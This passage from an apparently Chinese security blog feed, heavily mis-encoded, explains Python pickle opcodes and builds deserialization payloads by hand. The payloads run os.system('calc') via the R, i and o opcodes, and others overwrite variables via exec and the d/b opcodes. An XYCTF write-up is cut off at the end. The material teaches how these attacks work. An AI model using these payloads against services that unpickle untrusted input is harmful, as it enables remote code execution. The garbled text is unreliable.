style="text-align:center">å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td style="text-align:right">Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€\â€™ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">V</td><td style="text-align:center">å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td style="text-align:right">Vxxx\n</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">I</td><td style="text-align:center">å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td style="text-align:right">Ixxx\n</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">F</td><td style="text-align:center">å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td style="text-align:right">Fx.x\n</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">R</td><td style="text-align:center">é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td style="text-align:right">R</td><td style="text-align:right">å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td></tr><tr><td style="text-align:left">.</td><td style="text-align:center">ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td style="text-align:right">.</td><td style="text-align:right">æ— </td></tr><tr><td style="text-align:left">t</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td style="text-align:right">t</td><td style="text-align:right">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">)</td><td style="text-align:center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td style="text-align:right">)</td><td style="text-align:right">ç©ºå…ƒç»„å…¥æ ˆ</td></tr><tr><td style="text-align:left">l</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td style="text-align:right">l</td><td style="text-align:right">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">]</td><td style="text-align:center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td style="text-align:right">]</td><td style="text-align:right">ç©ºåˆ—è¡¨å…¥æ ˆ</td></tr><tr><td style="text-align:left">d</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td style="text-align:right">d</td><td style="text-align:right">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">}</td><td style="text-align:center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td style="text-align:right">}</td><td style="text-align:right">ç©ºå­—å…¸å…¥æ ˆ</td></tr><tr><td style="text-align:left">p</td><td style="text-align:center">å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td style="text-align:right">pn\n</td><td style="text-align:right">æ— </td></tr><tr><td style="text-align:left">g</td><td style="text-align:center">å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td style="text-align:right">gn\n</td><td style="text-align:right">å¯¹è±¡è¢«å‹æ ˆ</td></tr><tr><td style="text-align:left">0</td><td style="text-align:center">ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td style="text-align:right">0</td><td style="text-align:right">æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td></tr><tr><td style="text-align:left">b</td><td style="text-align:center">ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td style="text-align:right">b</td><td style="text-align:right">æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td></tr><tr><td style="text-align:left">s</td><td style="text-align:center">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td style="text-align:right">s</td><td style="text-align:right">ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td></tr><tr><td style="text-align:left">u</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td style="text-align:right">u</td><td style="text-align:right">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´</td></tr><tr><td style="text-align:left">a</td><td style="text-align:center">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td style="text-align:right">a</td><td style="text-align:right">æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td></tr><tr><td style="text-align:left">e</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td style="text-align:right">e</td><td style="text-align:right">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td></tr></tbody></table></div><h3 id="opcodeçš„è§£æè¿‡ç¨‹"><a href="#opcodeçš„è§£æè¿‡ç¨‹" class="headerlink" title="opcodeçš„è§£æè¿‡ç¨‹"></a>opcodeçš„è§£æè¿‡ç¨‹</h3><p>æˆ‘è¿™é‡Œç›´æ¥è´´å›¾äº†<br><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è§£æçš„è¿‡ç¨‹æ˜¯åœ¨æ ˆå†…å®ç°çš„ã€‚</p><h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>è¿™ä¸ªæ¨¡å—å¯ä»¥ä½¿æˆ‘ä»¬å¯ä»¥æ›´åŠ è½»æ¾çš„é˜…è¯»opcode<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;dir&quot;</span>,))</span><br><span class="line">haha=lalala()</span><br><span class="line">bb=pickle.dumps(haha,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(bb)</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(bb))</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="string">b&#x27;cnt\nsystem\np0\n(Vdir\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;nt system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">&#x27;dir&#x27;</span></span><br><span class="line">   <span class="number">20</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">23</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">24</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">27</span>: R    REDUCE</span><br><span class="line">   <span class="number">28</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">31</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure></p><h3 id="é‡ç‚¹åˆ†æ"><a href="#é‡ç‚¹åˆ†æ" class="headerlink" title="é‡ç‚¹åˆ†æ"></a>é‡ç‚¹åˆ†æ</h3><p>ç”±äºæˆ‘çš„æ˜¯windowsç«¯æ‰€ä»¥ç”Ÿæˆçš„opcodeçš„ç¬¬ä¸€æ­¥cæ‰€å¯¼å…¥çš„æ¨¡å—ä½¿ç”¨çš„æ˜¯nt systemå…¶ä¸­osè¢«æ›¿æ¢ä¸ºntè€Œntä»£è¡¨windowsç³»ç»Ÿã€‚ç„¶åç”¨på°†æ ˆé¡¶è¿›è¡Œå­˜å‚¨åœ¨memo_nï¼Œè€Œåä½¿ç”¨<code>(</code>å‹å…¥ä¸€ä¸ªMARKè¿™æ˜¯ä¸ºäº†åé¢çš„Ræ¥åšå‡†å¤‡ã€‚è€Œåç”¨Vå‹å…¥å­—ç¬¦ã€‚æœ€åå°±æ˜¯tå°†dirå­˜ä¸ºå…ƒç»„åä½¿ç”¨Ræ¥è¿›è¡Œå‡½æ•°æ‰§è¡Œï¼Œå‡½æ•°ä¸ºsystemï¼Œå‚æ•°ä¸ºdirã€‚<br>æˆ‘ä»¬ç»è¿‡åˆ†æå¯ä»¥å‘ç°å…¶æ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ã€‚å³æˆ‘ä»¬åœ¨ä½¿ç”¨pickle.dumpsæ¥ååºåˆ—åŒ–ä¸Šé¢çš„opcodeä¼šå‘½ä»¤æ‰§è¡Œos.system(â€˜dirâ€™)<br>ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥ä½¿ç”¨pyhtonçš„pickle.dumpsæ¥ç”Ÿæˆçš„opcodeä¼šä»¥ä¸ºæ“ä½œç³»ç»Ÿçš„ä¸åŒè€Œä¸åŒè€Œä¸åŒï¼Œè¿™ä¹Ÿå°±å¢åŠ äº†æŠ¥é”™çš„å¯èƒ½ã€‚è€Œä¸”ä½¿ç”¨è¿™ä¸ªæ¥æ„é€ è¿˜éå¸¸ä¸çµæ´»ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å­¦ä¼šæ‰‹åŠ¨æ„é€ ã€‚</p><h1 id="æ‰‹åŠ¨æ„é€ å‘½ä»¤æ‰§è¡Œçš„opcode"><a href="#æ‰‹åŠ¨æ„é€ å‘½ä»¤æ‰§è¡Œçš„opcode" class="headerlink" title="æ‰‹åŠ¨æ„é€ å‘½ä»¤æ‰§è¡Œçš„opcode"></a>æ‰‹åŠ¨æ„é€ å‘½ä»¤æ‰§è¡Œçš„opcode</h1><p>æˆ‘ä»¬çœ‹ä¸Šé¢çš„å¸¸ç”¨opcodeä¼šå‘ç°æœ‰ä¸‰ç§å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„opcodeï¼Œå³<code>R</code> <code>o</code> <code>i</code><br>æ„é€ åŸºç¡€çš„éš¾åº¦ä¸é«˜ï¼Œæˆ‘ä»¬åªè¦æ„é€ å‡ºos.system(â€˜calcâ€™)å³å‡½æ•°å¾ˆå‚æ•°å³å¯<br>å¦‚ä¸‹</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨cæ¥è·å–os.systemã€‚ä¹‹åå¯¼å…¥ä¸€ä¸ªMARKè¿™æ˜¯ä¸ºäº†ç”Ÿæˆå…ƒç»„åšçš„å‡†å¤‡ï¼ˆç”¨Ræ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‚æ•°å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œä¹‹åå°±æ˜¯ç”¨Så¯¼å…¥ä¸€ä¸ªå‚æ•°ã€‚åœ¨ç”¨tç”Ÿæˆå…ƒç»„ï¼Œåœ¨Ræ¥å‘½ä»¤æ‰§è¡Œ<br>å‰©ä¸‹çš„ä¹Ÿå¤§åŒå°å¼‚æˆ‘å°±ç›´æ¥å†™payloadäº†</p><h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="æ“æ§å®ä¾‹åŒ–å¯¹è±¡çš„å±æ€§"><a href="#æ“æ§å®ä¾‹åŒ–å¯¹è±¡çš„å±æ€§" class="headerlink" title="æ“æ§å®ä¾‹åŒ–å¯¹è±¡çš„å±æ€§"></a>æ“æ§å®ä¾‹åŒ–å¯¹è±¡çš„å±æ€§</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¥å®ä¾‹åŒ–ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡<br>è¿™ä¸ªopcodeä¹Ÿè¾ƒçŸ­æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ„é€ <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">lalala</span></span><br><span class="line"><span class="string">(S&#x27;dazhuang&#x27;</span></span><br><span class="line"><span class="string">S&#x27;benben&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">a=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">&lt;__main__.lalala <span class="built_in">object</span> at <span class="number">0x000001B52C191250</span>&gt;</span><br><span class="line">dazhuang benben</span><br></pre></td></tr></table></figure><br>æ„é€ å®ä¾‹åŒ–ç±»çš„opcodeçš„å¤§ä½“æ–¹æ³•ä¸å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œè¿™æ—¶å› ä¸ºå®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸å‡½æ•°ä¼ å‚æ‰§è¡Œçš„è¿‡ç¨‹éå¸¸åƒ<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ååºåˆ—åŒ–äº†è¿™ä¸ªopcodeæ—¶lalalaè¢«å®ä¾‹åŒ–äº†</p><h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><h3 id="è¦†ç›–å¯¼å…¥çš„å…¶ä»–pythonæ–‡ä»¶çš„å˜é‡"><a href="#è¦†ç›–å¯¼å…¥çš„å…¶ä»–pythonæ–‡ä»¶çš„å˜é‡" class="headerlink" title="è¦†ç›–å¯¼å…¥çš„å…¶ä»–pythonæ–‡ä»¶çš„å˜é‡"></a>è¦†ç›–å¯¼å…¥çš„å…¶ä»–pythonæ–‡ä»¶çš„å˜é‡</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">name=<span class="string">&quot;benben&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;secretå€¼ä¸º&#x27;</span>+secret.secret)</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;hahaha&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;secretå€¼ä¸º&#x27;</span>+secret.secret)</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">secretå€¼ä¸ºlalalala</span><br><span class="line">secretå€¼ä¸ºhahaha</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡<code>c__main__\nsecret</code>æ¥è·å–å¯¼å…¥çš„secretæ¨¡å—ã€‚åœ¨åˆ©ç”¨dæ“ä½œç¬¦æ¥å°†å…¶å˜ä¸ºå­—å…¸<code>&#123;&#39;secret&#39;:&#39;hahaha&#39;&#125;</code>è€Œååˆ©ç”¨dæ“ä½œç¬¦æ¥æ›´æ–°ã€‚è¿™å°±å¯¼è‡´äº†å…¶è¢«è¦†ç›–</p><h3 id="è¦†ç›–å½“å‰æ–‡ä»¶æ–‡ä»¶ä¸‹çš„å˜é‡"><a href="#è¦†ç›–å½“å‰æ–‡ä»¶æ–‡ä»¶ä¸‹çš„å˜é‡" class="headerlink" title="è¦†ç›–å½“å‰æ–‡ä»¶æ–‡ä»¶ä¸‹çš„å˜é‡"></a>è¦†ç›–å½“å‰æ–‡ä»¶æ–‡ä»¶ä¸‹çš„å˜é‡</h3><p>å¯¹äºå½“å‰æ–‡ä»¶ä¸‹çš„å˜é‡è¦†ç›–æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°execå’Œevalæ¥æ‰§è¡Œ<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘å¾’æ‰‹æ„é€ è¿™ä¸ªä¸€ç›´æŠ¥é”™ä½¿ç”¨è¿™ä¸ªæˆ‘å°±å…ˆå†™ä¸€ä¸‹ç”¨<strong>reduce</strong>æ¥æ„é€ çš„æ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªæ²¡æœ‰è®¾è®¡æ“ä½œç³»ç»Ÿçš„å‘½ä»¤æ‰§è¡Œï¼Œæ‰€æœ‰åªè¦æ˜¯pythonç¯å¢ƒå°±å¯ä»¥æ‰§è¡Œã€‚æ‰€æœ‰ä½¿ç”¨<strong>reduce</strong>æ¥æ„é€ çš„å³ä½¿åœ¨å…¶ä»–ç³»ç»Ÿä¹Ÿå¯ä»¥æ‰§è¡Œã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;benben&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;name=&#x27;dazhuang&#x27;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">opcode_app=pickle.dumps(a,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode_app)</span><br><span class="line">pickle.loads(opcode_app)</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"><span class="string">b&quot;c__builtin__\nexec\np0\n(Vname=&#x27;dazhuang&#x27;\np1\ntp2\nRp3\n.&quot;</span></span><br><span class="line">dazhuang</span><br></pre></td></tr></table></figure></p><h1 id="ä½¿ç”¨Pkeræ¥æ„é€ "><a href="#ä½¿ç”¨Pkeræ¥æ„é€ " class="headerlink" title="ä½¿ç”¨Pkeræ¥æ„é€ "></a>ä½¿ç”¨Pkeræ¥æ„é€ </h1>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> pickleååºåˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pickleååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF web</title>
      <link href="/2024/04/25/XYCTF-web/"/>
      <url>/2024/04/25/XYCTF-web/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ…æµ…å†™ä¸€ä¸‹wpå§ï¼Œwebå·®ä¸¤é¢˜æ²¡æœ‰å†™å‡ºæ¥ï¼Œä¸»è¦æ˜¯å› ä¸ºï¼Œèµ›äº‹æ—¶é—´å¤ªé•¿ï¼Œè¿˜è¦å¤§äºŒå¤§ä¸‰çš„è€ç™»å¤ªå¤šäº†ï¼Œæ²¡æœ‰æ‹¿å¥–çš„å¸Œæœ›ï¼Œå°±æ‡’çš„æ‰“äº†ã€‚ä¸‹é¢å°±å†™ä¸€ä¸‹æœ‰äº›éš¾åº¦çš„å§ï¼Œç®€å•é¢˜å°±ä¸å†™äº†ã€‚"><a href="#æµ…æµ…å†™ä¸€ä¸‹wpå§ï¼Œwebå·®ä¸¤é¢˜æ²¡æœ‰å†™å‡ºæ¥ï¼Œä¸»è¦æ˜¯å› ä¸ºï¼Œèµ›äº‹æ—¶é—´å¤ªé•¿ï¼Œè¿˜è¦å¤§äºŒå¤§ä¸‰çš„è€ç™»å¤ªå¤šäº†ï¼Œæ²¡æœ‰æ‹¿å¥–çš„å¸Œæœ›ï¼Œå°±æ‡’çš„æ‰“äº†ã€‚ä¸‹é¢å°±å†™ä¸€ä¸‹æœ‰äº›éš¾åº¦çš„å§ï¼Œç®€å•é¢˜å°±ä¸å†™äº†ã€‚" class="headerlink" title="æµ…æµ…å†™ä¸€ä¸‹wpå§ï¼Œwebå·®ä¸¤é¢˜æ²¡æœ‰å†™å‡ºæ¥ï¼Œä¸»è¦æ˜¯å› ä¸ºï¼Œèµ›äº‹æ—¶é—´å¤ªé•¿ï¼Œè¿˜è¦å¤§äºŒå¤§ä¸‰çš„è€ç™»å¤ªå¤šäº†ï¼Œæ²¡æœ‰æ‹¿å¥–çš„å¸Œæœ›ï¼Œå°±æ‡’çš„æ‰“äº†ã€‚ä¸‹é¢å°±å†™ä¸€ä¸‹æœ‰äº›éš¾åº¦çš„å§ï¼Œç®€å•é¢˜å°±ä¸å†™äº†ã€‚"></a>æµ…æµ…å†™ä¸€ä¸‹wpå§ï¼Œwebå·®ä¸¤é¢˜æ²¡æœ‰å†™å‡ºæ¥ï¼Œä¸»è¦æ˜¯å› ä¸ºï¼Œèµ›äº‹æ—¶é—´å¤ªé•¿ï¼Œè¿˜è¦å¤§äºŒå¤§ä¸‰çš„è€ç™»å¤ªå¤šäº†ï¼Œæ²¡æœ‰æ‹¿å¥–çš„å¸Œæœ›ï¼Œå°±æ‡’çš„æ‰“äº†ã€‚ä¸‹é¢å°±å†™ä¸€ä¸‹æœ‰äº›éš¾åº¦çš„å§ï¼Œç®€å•é¢˜å°±ä¸å†™äº†ã€‚</h1><h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><p>è¿™é¢˜éš¾åº¦ä¸æ˜¯ç‰¹åˆ«é«˜ä½†æ˜¯åˆä¸¤ä¸ªç®—æ–°åˆä¸æ˜¯ç‰¹åˆ«æ–°çš„çŸ¥è¯†ç‚¹<br>ç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯</p><h2 id="GCå›æ”¶æœºåˆ¶è§¦å‘destruct"><a href="#GCå›æ”¶æœºåˆ¶è§¦å‘destruct" class="headerlink" 